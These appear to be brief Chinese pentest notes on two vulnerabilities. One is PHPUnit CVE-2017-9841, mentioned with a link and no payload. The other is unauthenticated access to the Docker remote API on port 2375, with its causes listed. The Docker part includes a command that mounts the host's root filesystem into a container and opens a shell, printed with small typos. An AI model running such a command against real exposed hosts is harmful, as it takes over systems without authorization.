PHPUnit CVE-2017-9841 命令执行漏洞，漏洞原理可以看这里：https://blog.csdn.net/csacs/article/details/90640601

最开始用文章中的路径一直没执行成功，后来wireshark抓了一个包，获得了这个漏洞地址

Docker_remote_api未授权访问漏洞

漏洞成因

  1. dockerd -H unix:///var/run/docker. sock -H 0.0. 0.0:2375
  2. docker守护进程监听在0.0.0.0，外网可访问
  3. 没有使用iptable等限制可连接的来源ip。

漏洞利用

docker H tcp://*.*.*.*:2375 run -it-v /:/mnt imagelD /bin/bash

具体可以看：https://www.cnblogs.com/pythonal/p/9207696.html
